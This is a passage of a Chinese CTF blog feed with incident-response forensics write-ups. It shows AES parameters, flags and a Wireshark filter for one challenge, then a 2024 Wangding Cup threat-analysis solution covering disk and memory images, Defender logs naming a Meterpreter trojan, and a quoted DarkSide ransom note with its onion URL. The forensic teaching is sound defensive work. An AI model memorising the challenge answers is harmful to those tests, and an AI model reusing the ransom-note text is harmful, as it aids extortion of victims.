<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">时间线关联非常重要</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>将其作为密码解压压缩包，即可得到答案</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">flag{a1b2c3d4e5f67890abcdef1234567890-2f4d90a1b7c8e2349d3f56e0a9b01b8a-CBC}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="6">6<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024CCB&amp;CISCN-WinFT#6" class="hash-link" aria-label="6的直接链接" title="6的直接链接">​</a></h2>
<blockquote>
<p>通过 aes 解密得到的 flag</p>
</blockquote>
<p>对于上一题的答案进行分析，可以确定 AES 的参数</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Mode: CBC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Key: a1b2c3d4e5f67890abcdef1234567890</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iv: 2f4d90a1b7c8e2349d3f56e0a9b01b8a</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>对攻击者的 ip 地址 <code>192.168.116.130</code> 进行筛选</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ip.addr == 192.168.116.130</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241224-012455-450f067e62c00de782ac4fc023863d0d.png" width="2560" height="1540" class="img_ev3q"></p>
<p>经过排查，发现可能存在的 AES 密文</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241227-012735-9ce214fea0766c764ca1507f26925115.png" width="2560" height="1540" class="img_ev3q"></p>
<p>尝试进行解码</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241230-013016-45bb2ab00bf48a2f48c4a4b692d6467f.png" width="2560" height="1371" class="img_ev3q"></p>
<p>即可得到答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">flag{Hey, keep going and look for another flag}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>陈橘mo</name>
            <uri>https://randark.site</uri>
        </author>
        <category label="CTF" term="CTF"/>
        <category label="Incident-Response" term="Incident-Response"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[2024 网鼎杯 半决赛 安全运营挑战赛 威胁分析]]></title>
        <id>https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024wdb-Semis IncidentResponse-threat analysis</id>
        <link href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024wdb-Semis IncidentResponse-threat analysis"/>
        <updated>2024-12-02T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[2024 网鼎杯 半决赛 安全运营挑战赛 威胁分析]]></summary>
        <content type="html"><![CDATA[<p>2024 网鼎杯 半决赛 安全运营挑战赛 威胁分析</p>
<p>官方 writeup 未公布，无标准答案</p>
<p>按照题目描述进行检材分析</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="first-of-all---在此之前">First of all - 在此之前<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024wdb-Semis%20IncidentResponse-threat%20analysis#first-of-all---%E5%9C%A8%E6%AD%A4%E4%B9%8B%E5%89%8D" class="hash-link" aria-label="First of all - 在此之前的直接链接" title="First of all - 在此之前的直接链接">​</a></h2>
<p>对题目提供的附件进行分析，题目提供了以下附件</p>
<ul>
<li>dump.mem</li>
<li>disk.ad1</li>
<li>disk.ad1.txt</li>
</ul>
<p>其中，文件 <code>disk.ad1.txt</code> 的内容为</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Created By AccessData® FTK® Imager 4.7.1.2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Case Information:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Acquired using: ADI4.7.1.2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Case Number:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Evidence Number:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Unique Description:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Examiner:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Notes:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Information for C:\Users\skills\Desktop\disk.ad1:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[Custom Content Sources]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> F:\:NONAME [NTFS]|[root]|Windows|*(Wildcard,Consider Case,Include Subdirectories)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> F:\:NONAME [NTFS]|[root]|ProgramData|*(Wildcard,Consider Case,Include Subdirectories)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> F:\:NONAME [NTFS]|[root]|Program Files (x86)|*(Wildcard,Consider Case,Include Subdirectories)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> F:\:NONAME [NTFS]|[root]|Program Files|*(Wildcard,Consider Case,Include Subdirectories)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> F:\:NONAME [NTFS]|[root]|Documents and Settings|*(Wildcard,Consider Case,Include Subdirectories)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> F:\:NONAME [NTFS]|[root]|PerfLogs|*(Wildcard,Consider Case,Include Subdirectories)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> F:\:NONAME [NTFS]|[root]|System Volume Information|*(Wildcard,Consider Case,Include Subdirectories)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[Computed Hashes]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> MD5 checksum:    a576646c40769abb7dd36904417b6a4f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> SHA1 checksum:   9cee1fe36957674626661e1197b19b5f0b047026</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Image information:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Acquisition started:   Tue Nov  5 11:04:42 2024</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Acquisition finished:  Tue Nov  5 11:49:00 2024</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Segment list:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  C:\Users\skills\Desktop\disk.ad1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Image Verification Results:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Verification started:  Tue Nov  5 11:52:50 2024</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Verification finished: Tue Nov  5 12:07:07 2024</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> MD5 checksum:    a576646c40769abb7dd36904417b6a4f : verified</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> SHA1 checksum:   9cee1fe36957674626661e1197b19b5f0b047026 : verified</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>由此可以得知，文件 <code>disk.ad1</code> 是由 <code>FTK Imager</code> 所制作的磁盘镜像，文件 <code>dump.mem</code> 是目标计算机上捕获的内存镜像</p>
<p>对于 <code>disk.ad1</code> 文件，可以使用 <code>FTK Imager</code> 进行加载并挂载到虚拟盘符；而对于 <code>dump.mem</code> 文件，可以使用 <code>Volatility</code> 进行取证分析（需要内存镜像中系统版本对应的符号表）或者使用 <code>R-Studio</code> 对内存中的 <code>NTFS</code> 结构表进行读取分析，或者直接使用 <code>Strings</code> 进行暴力检索分析</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="威胁分析---01">威胁分析 - 01<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024wdb-Semis%20IncidentResponse-threat%20analysis#%E5%A8%81%E8%83%81%E5%88%86%E6%9E%90---01" class="hash-link" aria-label="威胁分析 - 01的直接链接" title="威胁分析 - 01的直接链接">​</a></h2>
<blockquote>
<p>在调查网络性能或安全问题时，了解特定应用程序在一段时间内的数据传输情况对于检测异常流量和潜在威胁至关重要。通过分析网络活动日志，我们可以确定是否存在数据泄露或异常通信。</p>
<p>请问，firefox 进程自有记录以来一共发送了多少字节的数据？（请将答案编辑并存入 <code>/opt/wxfx/answer/1.txt</code> 文件中，参考 <code>/opt/wxfx/example</code> 目录）</p>
</blockquote>
<p>基于题目描述，可以定位到 Windows 的服务报告使用数据库文件 <code>SRUDB.dat</code></p>
<p>参考资料 <a href="https://addshore.com/2023/10/see-all-windows-11-network-data-usage/" target="_blank" rel="noopener noreferrer">See all Windows 11 network data usage – addshore</a></p>
<p>在 <code>FTK Imager</code> 定位到 <code>SRUDB.dat</code> 文件的路径 <code>F:\Windows\System32\sru\SRUDB.dat</code></p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241205-120525-2085dd7efef559d4d4ba8e1b28fe2055.png" width="1902" height="1117" class="img_ev3q"></p>
<p>使用 <a href="https://www.nirsoft.net/utils/network_usage_view.html" target="_blank" rel="noopener noreferrer">NetworkUsageView - NirSoft</a> 进行查看</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241206-120620-109155fced8d4377f31e4b95793ac352.png" width="1902" height="1117" class="img_ev3q"></p>
<p>定位到 <code>firefox.exe</code> 进程的记录</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241207-120738-578da1bf991c6c149d5659cba94fb072.png" width="1902" height="1117" class="img_ev3q"></p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">3981907 + 384784 = 4366691</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>即可确定答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">4366691</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="威胁分析---02">威胁分析 - 02<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024wdb-Semis%20IncidentResponse-threat%20analysis#%E5%A8%81%E8%83%81%E5%88%86%E6%9E%90---02" class="hash-link" aria-label="威胁分析 - 02的直接链接" title="威胁分析 - 02的直接链接">​</a></h2>
<blockquote>
<p>识别安全防护软件的查杀记录，对于评估系统受感染的程度和了解攻击者所使用的工具至关重要。通过检查安全日志，可以获取被检测到的威胁信息。</p>
<p>请问，Windows Defender 检测到的第一个恶意软件的威胁 ID 是什么？（请将答案编辑并存入 <code>/opt/wxfx/answer/2.txt</code> 文件中，参考 <code>/opt/wxfx/example</code> 目录）</p>
</blockquote>
<p>在 <code>disk.ad1</code> 文件的磁盘数据中，定位到 <code>F:\Windows\System32\winevt\Logs\</code> 文件夹</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241220-232047-b6424ae86069dcd7c02f9ca37a98beed.png" width="1902" height="1117" class="img_ev3q"></p>
<p>将整个文件夹进行提取</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241221-232113-519b2f87bcff46d622a55fdec4e84ca5.png" width="1847" height="1259" class="img_ev3q"></p>
<p>根据 Windows Defender 的日志 ID 表 <a href="https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus" target="_blank" rel="noopener noreferrer">Microsoft Defender Antivirus event IDs and error codes - Microsoft Defender for Endpoint | Microsoft Learn</a> 可以知道，当 Windows Defender 检测到威胁时所记录的日志，其日志 ID 为 <code>1116</code></p>
<p>使用 <a href="https://www.nirsoft.net/utils/full_event_log_view.html" target="_blank" rel="noopener noreferrer">FullEventLogView - NirSoft</a> 进行分析</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241228-232844-a0af77010be709e8c3063ba6a5015299.png" width="1844" height="1247" class="img_ev3q"></p>
<p>或者直接定位到 Windows Defender 的操作日志文件 <code>Microsoft-Windows-Windows Defender%4Operational.evtx</code></p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241229-232905-3117be2cb7a942ec8211da94fe31c898.png" width="1964" height="1252" class="img_ev3q"></p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Windows Defender 已从隔离区删除一个项目。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 有关详细信息，请参阅以下内容:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">https://go.microsoft.com/fwlink/?linkid=37020&amp;name=Trojan:Win32/Meterpreter.O&amp;threatid=2147729928&amp;enterprise=0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  名称: Trojan:Win32/Meterpreter.O</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ID: 2147729928</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  严重性: Severe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  类别: Trojan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  用户: DESKTOP-M3JIVN3\skills</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  安全智能版本: AV: 1.421.82.0, AS: 1.421.82.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  引擎版本: 1.1.24090.11</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>即可确定答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">2147729928</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="威胁分析---03">威胁分析 - 03<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024wdb-Semis%20IncidentResponse-threat%20analysis#%E5%A8%81%E8%83%81%E5%88%86%E6%9E%90---03" class="hash-link" aria-label="威胁分析 - 03的直接链接" title="威�胁分析 - 03的直接链接">​</a></h2>
<blockquote>
<p>了解恶意软件的内部名称（如开发者给它的命名）有助于识别其家族、版本和特定功能，进而制定有效的防御策略。</p>
<p>请问，系统中正在运行的恶意软件的内部名称是什么？（请将答案编辑并存入 <code>/opt/wxfx/answer/3.txt</code> 文件中，参考 <code>/opt/wxfx/example</code> 目录）</p>
</blockquote>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="思路一-基于常见关键词进行定位">思路一 基于常见关键词进行定位<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024wdb-Semis%20IncidentResponse-threat%20analysis#%E6%80%9D%E8%B7%AF%E4%B8%80-%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%81%E5%85%B3%E9%94%AE%E8%AF%8D%E8%BF%9B%E8%A1%8C%E5%AE%9A%E4%BD%8D" class="hash-link" aria-label="思路一 基于常见关键词进行定位的直接链接" title="思路一 基于常见关键词进行定位的直接链接">​</a></h3>
<p>对内存镜像的 Strings 进行分析，经过常见恶意程序的关键词匹配，可以定位到内存中的以下部分</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241226-122607-ef1ee44e643f8da22a26e28c2f894426.png" width="1968" height="1327" class="img_ev3q"></p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;------------- [ Welcome to DarkSide] -------------&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> What happend?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ----------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Your computers and servers are encrypted, backups are deleted. We use strong encryption algorithms, so you cannot decrypt your data.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> But you can restore everything by purchasing a special program from us - universal decryptor. This program will restore all your network.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Follow our instructions below and you will recover all your data.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> What guarantees?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ----------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> We value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our interests.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> All our decryption software is perfectly tested and will decrypt your data. We will also provide support in case of problems.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> We guarantee to decrypt one file for free. Go to the site and contact us.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> How to get access on website?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ----------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Using a TOR browser:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 1) Download and install TOR browser from this site: https://torproject.org/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> 2) Open our website: http://darksidfqzcuhtk2.onion/GM0CG8TNZ83ZPUD15TL76BLDCG0ST24TR6NXG1J2AVXSKF8KS4KFIIN2ON5GRWD4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> When you open our website, put the following data in the input form:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Key:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> lsJTyyTnzJlGQ1I6sfwV6oVcXaRynwN6mWphA7BKXEDIHJcDlhNNHsrxlkpggRChK2nQ7wP0sknJvl37lbqElTopkUywK3QnfJFmqDBSCmFISeWSudjgwxB4kKSp7h4VySHeu4LmDiZXTAh1dbZHWxTtZ0bA6PhCoDrbGkctY4rucITW4IdYUZJC8d2B7SFnr5EA7EoRkajrZW54brM5Kgwqsz67qzH6Hk0Vr3EDcnGzNjGQBapJczIWkgPtMCJdTkeemQ34XH7wawXu3eOGV3uJlBZNoSuaxtDHMGApS8EWsUXhafMW8WxFLAPLCo6pdm7MLcLsVDp9iBXU1sLv2KkGyUJbO0KOmom9f1JREuidviHRfsndEgMFBAjyq5v4VEIraiioAbtWM7eecYaXPVt3rolsBi8mtjxLOpFj73NPPitoIDxBNfHGzXxvRTXi06Pjx9pRnAtjIqoq5wovnHa8uBel8nq8yDJTk7NWdGdsv3yVwV2TmBin7OvFqHN9lweFNJyuziKCVGEtSaglUNudMmpFnNObGlhfh58jQsrQiQZ2d3AOFsi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> !!! DANGER !!!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> DO NOT MODIFY or try to RECOVER any files yourself. We WILL NOT be able to RESTORE them.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> !!! DANGER !!!</span><br></span></code></pre><div 